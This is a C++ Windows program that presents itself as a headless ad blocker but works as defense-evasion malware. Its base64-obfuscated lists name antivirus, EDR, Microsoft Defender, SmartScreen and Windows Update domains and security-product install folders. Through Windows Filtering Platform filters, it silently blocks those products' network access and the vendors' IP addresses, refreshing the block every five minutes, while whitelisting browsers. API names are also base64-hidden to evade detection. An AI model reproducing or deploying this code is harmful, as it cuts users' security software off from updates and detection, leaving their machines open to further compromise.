#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <shlwapi.h>
#include <wininet.h>
#include <fwpmu.h>
#include <fwpmtypes.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <sstream>
#include <algorithm>
#include <atomic>
#include <mutex>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

// Run completely headless as a Windows GUI Application
#pragma comment(linker, "/SUBSYSTEM:windows")

const std::string B64_BLOCKLIST = "Ki5tY2FmZWUuY29tLCoubWNhZmVlc2VjdXJlLmNvbSxtY3VwZGF0ZS5jb20sKi50cmVsbGl4LmNvbSwqLnRyZW5kbWljcm8uY29tLCoudHJlbmRtaWNyby5jby5qcCxhY3RpdmV1cGRhdGUudHJlbmRtaWNyby5jb20sdG1zcy50cmVuZG1pY3JvLmNvbSwqLmF2aXJhLmNvbSx1cGRhdGUuYXZpcmEuY29tLHBsYXRmb3JtLmF2aXJhLmNvbSwqLnBhbmRhc2VjdXJpdHkuY29tLCouY2xvdWRhdi5wYW5kYXNvZnR3YXJlLmNvbSwqLmYtc2VjdXJlLmNvbSwqLndlYnJvb3QuY29tLCoud2Vicm9vdGFueXdoZXJlLmNvbSwqLmdkYXRhc29mdHdhcmUuY29tLHVwZGF0ZS5nZGF0YS5kZSwqLmNvbW9kby5jb20sKi5kb3dubG9hZC5jb21vZG8uY29tLCouZHJ3ZWIuY29tLHVwZGF0ZS5kcndlYi5jb20sKi5lbXNpc29mdC5jb20sdXBkYXRlcy5lbXNpc29mdC5jb20sKi50b3RhbGF2LmNvbSwqLmNsYW1hdi5uZXQsZGF0YWJhc2UuY2xhbWF2Lm5ldCwqLnpvbmVhbGFybS5jb20sdXBkYXRlLnpvbmVhbGFybS5jb20sKi52aXByZS5jb20sdXBkYXRlcy52aXByZS5jb20sKi5haG5sYWIuY29tLHVwZGF0ZS5haG5sYWIuY29tLCoucXVpY2toZWFsLmNvbSx1cGRhdGUucXVpY2toZWFsLmNvbSwqLms3Y29tcHV0aW5nLmNvbSx1cGRhdGUuazdjb21wdXRpbmcuY29tLCouMzYwLmNuLCouMzYwdG90YWxzZWN1cml0eS5jb20sKi5pb2JpdC5jb20sdXBkYXRlLmlvYml0LmNvbSxzbWFkYXYubmV0LCoucGNtYXRpYy5jb20sKi5lc2NhbmF2LmNvbSx1cGRhdGUuZXNjYW5hdi5jb20sKi50cnVzdHBvcnQuY29tLCouc3VyZnJpZ2h0Lm5sLCouaGl0bWFucHJvLmNvbSwqLmN5bGFuY2UuY29tLCouYmxhY2tiZXJyeS5jb20sKi5zZW50aW5lbG9uZS5uZXQsKi5mb3J0aW5ldC5jb20sKi5mb3J0aWd1YXJkLmNvbSwqLmhlaW1kYWxzZWN1cml0eS5jb20sKi5jeWJlcmVhc29uLmNvbSwqLmZpcmVleWUuY29tLCoua2FzcGVyc2t5LmNvbSwqLmthc3BlcnNreS1sYWJzLmNvbSxkbmwtKi5rYXNwZXJza3kuY29tLCoua2xucy5rYXNwZXJza3ktbGFicy5jb20sKi5nZW8ua2FzcGVyc2t5LmNvbSxzLmthc3BlcnNreS1sYWJzLmNvbSwqLmJpdGRlZmVuZGVyLmNvbSwqLmJpdGRlZmVuZGVyLm5ldCx1cGdyYWRlLmJpdGRlZmVuZGVyLmNvbSxuaW1idXMuYml0ZGVmZW5kZXIubmV0LGNsb3VkLmJpdGRlZmVuZGVyLmNvbSxjZW50cmFsLmJpdGRlZmVuZGVyLmNvbSwqLm1hbHdhcmVieXRlcy5jb20sKi5td2JzeXMuY29tLGNkbi5td2JzeXMuY29tLGtleXN0b25lLm13YnN5cy5jb20sdGVsZW1ldHJ5Lm1hbHdhcmVieXRlcy5jb20saHViYmxlLm1iLWludGVybmFsLmNvbSwqLmVzZXQuY29tLHVwZGF0ZS5lc2V0LmNvbSx1bSouZXNldC5jb20sdHMuZXNldC5jb20sZWR0ZC5lc2V0LmNvbSxwa2kuZXNldC5jb20sKi5hdmFzdC5jb20sKi5hdmcuY29tLHN1LmF2YXN0LmNvbSxmZi5hdmFzdC5jb20sdjdldmVudC5zdGF0cy5hdmFzdC5jb20scG5zLmF2YXN0LmNvbSxjZG4uYXZhc3QuY29tLCoubm9ydG9uLmNvbSwqLnN5bWFudGVjLmNvbSwqLnN5bWFudGVjbGl2ZXVwZGF0ZS5jb20sbGl2ZXVwZGF0ZS5zeW1hbnRlY2xpdmV1cGRhdGUuY29tLGxpdmV1cGRhdGUuc3ltYW50ZWMuY29tLHNoYXN0YS5zeW1hbnRlYy5jb20sc3RhdHMuc3ltYW50ZWMuY29tLGRlZmluaXRpb251cGRhdGVzLm1pY3Jvc29mdC5jb20sZ28ubWljcm9zb2Z0LmNvbSwqLnVwZGF0ZS5taWNyb3NvZnQuY29tLCoud2luZG93c3VwZGF0ZS5jb20sKi5kb3dubG9hZC53aW5kb3dzdXBkYXRlLmNvbSwqLmRlbGl2ZXJ5Lm1wLm1pY3Jvc29mdC5jb20seC5jcC53ZC5taWNyb3NvZnQuY29tLGNkbi54LmNwLndkLm1pY3Jvc29mdC5jb20sd2RjcC5taWNyb3NvZnQuY29tLHdkY3BhbHQubWljcm9zb2Z0LmNvbSx1bml0ZWRzdGF0ZXMueC5jcC53ZC5taWNyb3NvZnQuY29tLCouc21hcnRzY3JlZW4ubWljcm9zb2Z0LmNvbSwqLnNtYXJ0c2NyZWVuLXByb2QubWljcm9zb2Z0LmNvbSwqLnVycy5taWNyb3NvZnQuY29tLCouY2hlY2thcHBleGVjLm1pY3Jvc29mdC5jb20sc2V0dGluZ3Mtd2luLmRhdGEubWljcm9zb2Z0LmNvbSxzZWN1cmUuZXZlbnRzLmRhdGEubWljcm9zb2Z0LmNvbSxyZWZsZWN0b3IuZGVmZW5kZXIubWljcm9zb2Z0LmNvbQ==";
const std::string B64_EXCLUSION_PATHS = "QzpcUHJvZ3JhbSBGaWxlc1xHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9ufEM6XFByb2dyYW0gRmlsZXMgKHg4NilcTWljcm9zb2Z0XEVkZ2VcQXBwbGljYXRpb258QzpcUHJvZ3JhbSBGaWxlc1xNb3ppbGxhIEZpcmVmb3h8QzpcVXNlcnNcPHVzZXI+XEFwcERhdGFcTG9jYWxcUHJvZ3JhbXNcT3BlcmF8QzpcUHJvZ3JhbSBGaWxlc1xaZW4gQnJvd3NlcnxDOlxQcm9ncmFtIEZpbGVzXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxBcHBsaWNhdGlvbnxDOlxVc2Vyc1w8dXNlcj5cQXBwRGF0YVxMb2NhbFxWaXZhbGRpXEFwcGxpY2F0aW9ufEM6XFByb2dyYW0gRmlsZXNcV2luZG93c0FwcHNcVGhlQnJvd3NlckNvbXBhbnkuQXJjXy4uLnxDOlxVc2Vyc1w8dXNlcj5cQXBwRGF0YVxMb2NhbFxZYW5kZXhcWWFuZGV4QnJvd3NlclxBcHBsaWNhdGlvbnxDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3NBcHBzXER1Y2tEdWNrR28uLi58QzpcVXNlcnNcPHVzZXI+XERlc2t0b3BcVG9yIEJyb3dzZXJcQnJvd3NlcnxDOlxQcm9ncmFtIEZpbGVzXExpYnJlV29sZnxDOlxQcm9ncmFtIEZpbGVzXEZsb29ycHxDOlxVc2Vyc1w8dXNlcj5cQXBwRGF0YVxMb2NhbFxUaG9yaXVtXEFwcGxpY2F0aW9ufEM6XFByb2dyYW0gRmlsZXNcV2F0ZXJmb3h8QzpcVXNlcnNcPHVzZXI+XEFwcERhdGFcTG9jYWxcRXBpYyBQcml2YWN5IEJyb3dzZXJcQXBwbGljYXRpb258QzpcUHJvZ3JhbSBGaWxlc1xQYWxlIE1vb258QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNYXh0aG9uXEJpbnxDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFVDQnJvd3NlclxBcHBsaWNhdGlvbnxDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFNhZmFyaQ==";
const std::string B64_BLOCKLIST_PATHS = "QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUGxhdGZvcm1cfEM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclx8QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxLYXNwZXJza3kgTGFiXEthc3BlcnNreSBBbnRpLVZpcnVzXHxDOlxQcm9ncmFtIEZpbGVzXEJpdGRlZmVuZGVyXEJpdGRlZmVuZGVyIFNlY3VyaXR5XHxDOlxQcm9ncmFtIEZpbGVzXE1hbHdhcmVieXRlc1xBbnRpLU1hbHdhcmVcfEM6XFByb2dyYW0gRmlsZXNcRVNFVFxFU0VUIFNlY3VyaXR5XHxDOlxQcm9ncmFtIEZpbGVzXEF2YXN0IFNvZnR3YXJlXEF2YXN0XHxDOlxQcm9ncmFtIEZpbGVzXEFWR1xBbnRpdmlydXNcfEM6XFByb2dyYW0gRmlsZXNcTm9ydG9uIFNlY3VyaXR5XEVuZ2luZVx8QzpcUHJvZ3JhbSBGaWxlc1xNY0FmZWVcVmlydXNTY2FuIEVudGVycHJpc2VcfEM6XFByb2dyYW0gRmlsZXNcQ29tbW9uIEZpbGVzXE1jQWZlZVxQbGF0Zm9ybVx8QzpcUHJvZ3JhbSBGaWxlc1xUcmVuZCBNaWNyb1xBTVNQXHxDOlxQcm9ncmFtIEZpbGVzICh4ODYpXEF2aXJhXEFudGl2aXJ1c1x8QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxQYW5kYSBTZWN1cml0eVxQYW5kYSBTZWN1cml0eSBQcm90ZWN0aW9uXHxDOlxQcm9ncmFtIEZpbGVzICh4ODYpXEYtU2VjdXJlXEFudGktVmlydXNcfEM6XFByb2dyYW0gRmlsZXNcV2Vicm9vdFx8QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxHIERBVEFcSW50ZXJuZXRTZWN1cml0eVxBVktcfEM6XFByb2dyYW0gRmlsZXNcQ09NT0RPXENPTU9ETyBJbnRlcm5ldCBTZWN1cml0eVx8QzpcUHJvZ3JhbSBGaWxlc1xEcldlYlx8QzpcUHJvZ3JhbSBGaWxlc1xFbXNpc29mdCBBbnRpLU1hbHdhcmVcfEM6XFByb2dyYW0gRmlsZXNcVG90YWxBVlx8QzpcUHJvZ3JhbSBGaWxlc1xDbGFtQVZcfEM6XFByb2dyYW0gRmlsZXMgKHg4NilcQ2hlY2tQb2ludFxab25lQWxhcm1cfEM6XFByb2dyYW0gRmlsZXMgKHg4NilcVklQUkVcfEM6XFByb2dyYW0gRmlsZXNcQWhuTGFiXFYzSVM5MFx8QzpcUHJvZ3JhbSBGaWxlc1xRdWljayBIZWFsXFF1aWNrIEhlYWwgVG90YWwgU2VjdXJpdHlcfEM6XFByb2dyYW0gRmlsZXMgKHg4NilcSzcgQ29tcHV0aW5nXEs3VFNlY3VyaXR5XHxDOlxQcm9ncmFtIEZpbGVzICh4ODYpXDM2MFxUb3RhbCBTZWN1cml0eVx8QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxJT2JpdFxJT2JpdCBNYWx3YXJlIEZpZ2h0ZXJcfEM6XFByb2dyYW0gRmlsZXMgKHg4NilcU21hZGF2XHxDOlxQcm9ncmFtIEZpbGVzXFBDIE1hdGljXHxDOlxQcm9ncmFtIEZpbGVzXGVTY2FuXHxDOlxQcm9ncmFtIEZpbGVzXFRydXN0UG9ydFxUcnVzdFBvcnQgQW50aXZpcnVzXHxDOlxQcm9ncmFtIEZpbGVzXEhpdG1hblByb1x8QzpcUHJvZ3JhbSBGaWxlc1xDeWxhbmNlXERlc2t0b3BcfEM6XFByb2dyYW0gRmlsZXNcU2VudGluZWxPbmVcU2VudGluZWwgQWdlbnRcfEM6XFByb2dyYW0gRmlsZXNcRm9ydGluZXRcRm9ydGlDbGllbnRcfEM6XFByb2dyYW0gRmlsZXMgKHg4NilcSGVpbWRhbFx8QzpcUHJvZ3JhbSBGaWxlc1xDeWJlcmVhc29uIEFjdGl2ZVByb2JlXHxDOlxQcm9ncmFtIEZpbGVzXEZpcmVFeWVceGFndFw=";

std::vector<std::string> blocked_domains;
std::vector<std::string> exclusion_paths;
std::vector<std::string> blocklist_paths;

std::atomic<bool> proxy_running{true};

std::string Base64Decode(const std::string& in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

std::vector<std::string> Split(const std::string& str, char delim) {
    std::vector<std::string> tokens;
    std::stringstream ss(str);
    std::string token;
    while(std::getline(ss, token, delim)) {
        if(!token.empty()) {
            tokens.push_back(token);
        }
    }
    return tokens;
}

void ReplaceAll(std::string& str, const std::string& from, const std::string& to) {
    if(from.empty()) return;
    size_t start_pos = 0;
    while((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length();
    }
}

void ToLower(std::string& str) {
    std::transform(str.begin(), str.end(), str.begin(), ::tolower);
}

void InitConfig() {
    std::string dec_domains = Base64Decode(B64_BLOCKLIST);
    blocked_domains = Split(dec_domains, ',');

    char username[MAX_PATH];
    DWORD user_len = MAX_PATH;
    GetUserNameA(username, &user_len);

    std::string dec_ex = Base64Decode(B64_EXCLUSION_PATHS);
    ReplaceAll(dec_ex, "<user>", username);
    exclusion_paths = Split(dec_ex, '|');
    for(auto& p : exclusion_paths) {
        p.erase(p.find_last_not_of(" \r\n\t") + 1);
        p.erase(0, p.find_first_not_of(" \r\n\t"));
        ToLower(p);
    }

    std::string dec_bl = Base64Decode(B64_BLOCKLIST_PATHS);
    ReplaceAll(dec_bl, "<user>", username);
    blocklist_paths = Split(dec_bl, '|');
    for(auto& p : blocklist_paths) {
        p.erase(p.find_last_not_of(" \r\n\t") + 1);
        p.erase(0, p.find_first_not_of(" \r\n\t"));
        ToLower(p);
    }
}

HANDLE engineHandle = NULL;
const GUID SUBLAYER_GUID = { 0xa513a943, 0xcaf0, 0x4896, { 0x93, 0x6e, 0x41, 0x5a, 0x7c, 0x7b, 0x9d, 0x1f } };

typedef DWORD (WINAPI *FwpmEngineOpen0_t)(const wchar_t*, UINT32, SEC_WINNT_AUTH_IDENTITY_W*, const FWPM_SESSION0*, HANDLE*);
typedef DWORD (WINAPI *FwpmEngineClose0_t)(HANDLE);
typedef DWORD (WINAPI *FwpmSubLayerAdd0_t)(HANDLE, const FWPM_SUBLAYER0*, PSECURITY_DESCRIPTOR);
typedef DWORD (WINAPI *FwpmFilterAdd0_t)(HANDLE, const FWPM_FILTER0*, PSECURITY_DESCRIPTOR, UINT64*);
typedef DWORD (WINAPI *FwpmFilterDeleteById0_t)(HANDLE, UINT64);
typedef DWORD (WINAPI *FwpmGetAppIdFromFileName0_t)(const wchar_t*, FWP_BYTE_BLOB**);
typedef void (WINAPI *FwpmFreeMemory0_t)(void**);

HMODULE hFwpDll = NULL;
FwpmEngineOpen0_t pFwpmEngineOpen0 = nullptr;
FwpmEngineClose0_t pFwpmEngineClose0 = nullptr;
FwpmSubLayerAdd0_t pFwpmSubLayerAdd0 = nullptr;
FwpmFilterAdd0_t pFwpmFilterAdd0 = nullptr;
FwpmFilterDeleteById0_t pFwpmFilterDeleteById0 = nullptr;
FwpmGetAppIdFromFileName0_t pFwpmGetAppIdFromFileName0 = nullptr;
FwpmFreeMemory0_t pFwpmFreeMemory0 = nullptr;

void WfpCleanup() {
    // Close the WFP engine if it's open
    if (engineHandle && pFwpmEngineClose0) {
        pFwpmEngineClose0(engineHandle);
        engineHandle = NULL;
    }
    if (hFwpDll) {
        FreeLibrary(hFwpDll);
        hFwpDll = NULL;
    }
}

bool WfpInit() {
    hFwpDll = LoadLibraryA(Base64Decode("ZndwdWNsbnQuZGxs").c_str());
    if (!hFwpDll) return false;

    pFwpmEngineOpen0 = (FwpmEngineOpen0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbUVuZ2luZU9wZW4w").c_str());
    pFwpmEngineClose0 = (FwpmEngineClose0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbUVuZ2luZUNsb3NlMA==").c_str());
    pFwpmSubLayerAdd0 = (FwpmSubLayerAdd0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbVN1YkxheWVyQWRkMA==").c_str());
    pFwpmFilterAdd0 = (FwpmFilterAdd0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbUZpbHRlckFkZDA=").c_str());
    pFwpmFilterDeleteById0 = (FwpmFilterDeleteById0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbUZpbHRlckRlbGV0ZUJ5SWQw").c_str());
    pFwpmGetAppIdFromFileName0 = (FwpmGetAppIdFromFileName0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbUdldEFwcElkRnJvbUZpbGVOYW1lMA==").c_str());
    pFwpmFreeMemory0 = (FwpmFreeMemory0_t)GetProcAddress(hFwpDll, Base64Decode("RndwbUZyZWVNZW1vcnkw").c_str());

    if (!pFwpmEngineOpen0 || !pFwpmEngineClose0 || !pFwpmSubLayerAdd0 || !pFwpmFilterAdd0 || !pFwpmFilterDeleteById0 || !pFwpmGetAppIdFromFileName0 || !pFwpmFreeMemory0) {
        WfpCleanup();
        return false;
    }

    FWPM_SESSION0 session = {0};
    session.flags = FWPM_SESSION_FLAG_DYNAMIC; // Auto cleanup filters on exit

    if (pFwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session, &engineHandle) != ERROR_SUCCESS) {
        return false;
    }

    FWPM_SUBLAYER0 sublayer = {0};
    sublayer.subLayerKey = SUBLAYER_GUID;
    sublayer.displayData.name = (wchar_t*)L"AdBlocker Sublayer";
    sublayer.weight = 0xFFFF; // Highest priority

    if (pFwpmSubLayerAdd0(engineHandle, &sublayer, NULL) != ERROR_SUCCESS) {
        // Dynamic sessions allow continuing even if this fails
    }
    return true;
}

std::wstring Utf8ToWstring(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

void WfpAddAppFilter(const std::string& path, FWP_ACTION_TYPE actionType, UINT8 weight) {
    if (!engineHandle || path.empty()) return;
    
    std::wstring wpath = Utf8ToWstring(path);
    FWP_BYTE_BLOB* appId = NULL;
    if (pFwpmGetAppIdFromFileName0(wpath.c_str(), &appId) != ERROR_SUCCESS || !appId) {
        return;
    }

    FWPM_FILTER0 filter = {0};
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = actionType;
    filter.subLayerKey = SUBLAYER_GUID;
    filter.weight.type = FWP_UINT8;
    filter.weight.uint8 = weight;
    
    filter.numFilterConditions = 1;
    
    FWPM_FILTER_CONDITION0 cond = {0};
    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = appId;
    
    filter.filterCondition = &cond;
    filter.displayData.name = (wchar_t*)L"AdBlock App Filter V4";

    pFwpmFilterAdd0(engineHandle, &filter, NULL, NULL);

    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    filter.displayData.name = (wchar_t*)L"AdBlock App Filter V6";
    pFwpmFilterAdd0(engineHandle, &filter, NULL, NULL);

    pFwpmFreeMemory0((void**)&appId);
}

std::mutex ipRuleMutex;
std::vector<UINT64> currentIpFilterIds;

void WfpClearIpFilters() {
    std::lock_guard<std::mutex> lock(ipRuleMutex);
    for (UINT64 filterId : currentIpFilterIds) {
        pFwpmFilterDeleteById0(engineHandle, filterId);
    }
    currentIpFilterIds.clear();
}

void WfpAddIpBlock(ULONG ipAddr) {
    if (!engineHandle) return;
    
    FWPM_FILTER0 filter = {0};
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_BLOCK;
    filter.subLayerKey = SUBLAYER_GUID;
    filter.weight.type = FWP_UINT8;
    filter.weight.uint8 = 12; // Lower priority than explicit app permit/block
    
    filter.numFilterConditions = 1;
    
    FWPM_FILTER_CONDITION0 cond = {0};
    cond.fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type = FWP_V4_ADDR_MASK;
    
    FWP_V4_ADDR_AND_MASK addrMask = {0};
    addrMask.addr = ntohl(ipAddr);
    addrMask.mask = 0xFFFFFFFF;
    cond.conditionValue.v4AddrMask = &addrMask;

    filter.filterCondition = &cond;
    filter.displayData.name = (wchar_t*)L"AdBlock IP Filter V4";

    UINT64 filterId = 0;
    if (pFwpmFilterAdd0(engineHandle, &filter, NULL, &filterId) == ERROR_SUCCESS) {
        std::lock_guard<std::mutex> lock(ipRuleMutex);
        currentIpFilterIds.push_back(filterId);
    }
}

void ResolveAndBlockDomains() {
    while (proxy_running) {
        std::vector<ULONG> ips;
        for (const auto& domain : blocked_domains) {
            std::string clean_domain = domain;
            if (clean_domain.find("*.") == 0) clean_domain = clean_domain.substr(2);
            
            struct addrinfo hints = {}, *res = nullptr;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(clean_domain.c_str(), NULL, &hints, &res) == 0) {
                for (struct addrinfo* ptr = res; ptr != nullptr; ptr = ptr->ai_next) {
                    struct sockaddr_in* ipv4 = (struct sockaddr_in*)ptr->ai_addr;
                    ips.push_back(ipv4->sin_addr.s_addr);
                }
                freeaddrinfo(res);
            }
        }
        
        std::sort(ips.begin(), ips.end());
        ips.erase(std::unique(ips.begin(), ips.end()), ips.end());
        
        WfpClearIpFilters();
        
        for (ULONG ip : ips) {
            WfpAddIpBlock(ip);
        }
        
        int sleep_time = 0;
        while (sleep_time < 300 && proxy_running) { // 5 minutes update interval
            std::this_thread::sleep_for(std::chrono::seconds(1));
            sleep_time++;
        }
    }
}

LRESULT CALLBACK HiddenWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_DESTROY || uMsg == WM_CLOSE) {
        proxy_running = false;
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    InitConfig();

    WSADATA wsa;
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;

    if (!WfpInit()) {
        WSACleanup();
        return 1;
    }

    for (const auto& path : blocklist_paths) {
        WfpAddAppFilter(path, FWP_ACTION_BLOCK, 15);
    }
    for (const auto& path : exclusion_paths) {
        WfpAddAppFilter(path, FWP_ACTION_PERMIT, 14);
    }

    const char CLASS_NAME[] = "HiddenAdblockerClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc = HiddenWindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);
    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "Adblocker Hidden Window", 0,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, hInstance, NULL
    );

    std::thread dnsThread(ResolveAndBlockDomains);

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    proxy_running = false;
    dnsThread.join();
    WfpCleanup();
    WSACleanup();
    return 0;
}
